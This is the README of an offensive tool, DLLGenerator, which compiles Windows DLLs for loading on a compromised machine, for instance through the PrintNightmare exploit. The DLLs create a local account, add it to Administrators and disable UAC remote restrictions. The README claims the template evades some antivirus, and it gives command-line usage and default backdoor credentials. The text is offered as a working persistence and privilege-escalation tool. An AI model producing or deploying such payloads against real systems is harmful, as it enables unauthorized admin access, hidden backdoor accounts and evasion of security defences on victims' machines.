# DLLGenerator

## What ? 

Dllgenerator is a quick tool to generate DLL, it is designed to be quickly effective. 

## Why ? 

Sometimes you can only execute one DLL on a remote machine, and you have no connect back possible because of AV (like in the printnightmare exploit).

To bypass this you can : 
 - Create a local account
 - Add your local account to Administrators ( or Administrateurs 🇫🇷)
 - Disable UAC control 

Seems easy no ? 
In fact it is ! But it's boring to keep one file somewhere and don't remember how it works.
And one day you remove one line (uac for example) and you forgot it ..

## How ? 

Dllgenerator is based on a template file that (on july 2022) still bypass some AV. 
It takes your input and generate a sexy DLLFile with it. 
DLL is not encoded or whatever, but you may consider put it in a wrapper. 

## Dependency 

A cross compilator `mingw-w64-gcc` is used by default but you can customise the `--compilator` parameter.


## Man 

```
python generator.py 
usage: generator.py [-h] [--action {create_user,add_to_group,unset_uac} [{create_user,add_to_group,unset_uac} ...]] [--username USERNAME] [--password PASSWORD] [--group GROUP]
                    [--wrapper WRAPPER] [--compliator COMPLIATOR] [--output OUTPUT]

______ _ _                                   _             
|  _  | | |                                 | |            
| | | | | |   __ _  ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
| | | | | |  / _` |/ _ | '_ \ / _ | '__/ _` | __/ _ \| '__|
| |/ /| | | | (_| |  __| | | |  __| | | (_| | || (_) | |   
|___/ |_|_|  \__, |\___|_| |_|\___|_|  \__,_|\__\___/|_|   
              __/ |                                        
             |___/                                         
        Version : 1.0
        Author : shoxxdj

options:
  -h, --help            show this help message and exit
  --action {create_user,add_to_group,unset_uac} [{create_user,add_to_group,unset_uac} ...]
                        Main action
  --username USERNAME, -u USERNAME
                        Your username
  --password PASSWORD, -p PASSWORD
                        Your password matching the rules
  --group GROUP, -g GROUP
                        The group, tips for FR it's Administrateur
  --wrapper WRAPPER, -w WRAPPER
                        A command wrapper
  --compliator COMPLIATOR, -c COMPLIATOR
                        A C compilator : 'i686-w64-mingw32-gcc -lnetapi32' is an option
  --output OUTPUT, -o OUTPUT
                        path and name of your dll

```

### Create your first DLL 

```
python generator.py --action create_user add_to_group unset_uac
```
This will : 
- Create a local account : hoppy / H0pBreWedW1thl0v3 
- Add the account hoppy to group Administrators
- Set the regitry key to disable the functionnality in UAC that prevent remote connection
- Output as hoppy.dll in local directory

### Create a custom DLL 
```
python generator.py --action create_user add_to_group -u malt -p Il0v3b33r5 -g BrewersGroup -o /tmp/beer.dll
```
This will :
- Create a local account malt / Il0v3b33r5
- Add the account malt to BrewersGroup
- Output to /tmp as beer.dll